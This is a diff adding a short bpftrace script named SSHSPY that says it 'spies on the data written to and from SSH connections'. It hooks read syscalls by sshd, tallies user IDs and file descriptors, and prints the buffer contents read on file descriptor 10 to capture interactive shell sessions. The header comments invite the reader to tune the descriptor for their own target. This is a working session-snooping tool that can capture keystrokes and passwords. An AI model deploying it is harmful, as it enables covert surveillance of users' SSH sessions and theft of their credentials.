@@ -1,10 +1,37 @@
+#!/usr/bin/env bpftrace
 /*
 ====SSHSPY====
 This tool spies on the data written to and from SSH connections! 
 Oh sure,it's tunneled traffic, but not to the kernel!
+
+This won't look that pretty, but ti will contain user interactions.
 */
 
 BEGIN
 {
-  printf("Spying on SSH Connections...");
+  printf("Start spying on SSH Connections at: ");
+  time();
+}
+
+tracepoint:syscalls:sys_enter_read
+/comm == "sshd"/ 
+{ 
+  // printf("SSH FD: %d\n", args->fd);
+  @uids[uid] = count();
+  @fds[args->fd] = count();
+}
+
+// FD 10 seems to be the most common read for incoming shell connections, but 
+// you should experiment to see what works for you
+tracepoint:syscalls:sys_enter_read
+/ args->fd == 10 /
+{
+
+  printf("%s", str(args->buf));
+}
+
+END
+{
+  printf("Finished spying at: ");
+  time();
 }
